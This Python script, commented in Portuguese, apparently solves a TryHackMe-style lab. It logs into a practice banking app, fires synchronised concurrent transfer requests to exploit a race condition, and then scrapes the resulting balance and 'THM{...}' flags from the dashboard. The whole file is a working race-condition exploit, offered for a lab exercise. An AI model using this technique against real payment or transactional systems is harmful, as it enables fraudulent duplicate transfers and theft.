"""Reproduz transferências concorrentes apenas no banco de teste do dia 12."""

import argparse
import concurrent.futures
import re
import threading

import requests


parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument("url", help="URL base da aplicação de laboratório")
parser.add_argument("--conta", required=True, help="conta de teste de origem")
parser.add_argument("--senha", required=True, help="senha de teste")
parser.add_argument("--destino", required=True, help="conta de teste de destino")
parser.add_argument("--tentativas", type=int, default=12)
parser.add_argument("--valor", type=int, default=500)
args = parser.parse_args()
if not 1 <= args.tentativas <= 30 or args.valor <= 0:
    parser.error("use de 1 a 30 tentativas e valor positivo")

base = args.url.rstrip("/")
session = requests.Session()
login = session.post(
    f"{base}/login",
    data={"account_number": args.conta, "password": args.senha}, timeout=10,
)
if "Welcome" not in login.text:
    raise SystemExit(f"Login falhou: HTTP {login.status_code}, URL {login.url}")

barrier = threading.Barrier(args.tentativas)


def transfer(index):
    barrier.wait(timeout=10)
    response = requests.post(
        f"{base}/transfer",
        data={"account_number": args.destino, "amount": str(args.valor)},
        cookies=session.cookies, timeout=20,
    )
    return index, response.status_code, "Success!" in response.text


with concurrent.futures.ThreadPoolExecutor(max_workers=args.tentativas) as pool:
    results = list(pool.map(transfer, range(args.tentativas)))

print(f"Tentativas: {args.tentativas}; sucessos informados: {sum(x[2] for x in results)}")
print(f"HTTP: {[x[1] for x in results]}")
dashboard = session.get(f"{base}/dashboard", timeout=10).text
balance = re.search(r"Balance:\s*\$\s*(-?\d+)", dashboard)
print(f"Saldo: {balance.group(1) if balance else 'não localizado'}")
print(f"Flags no dashboard: {re.findall(r'THM\{[^}]+\}', dashboard)}")
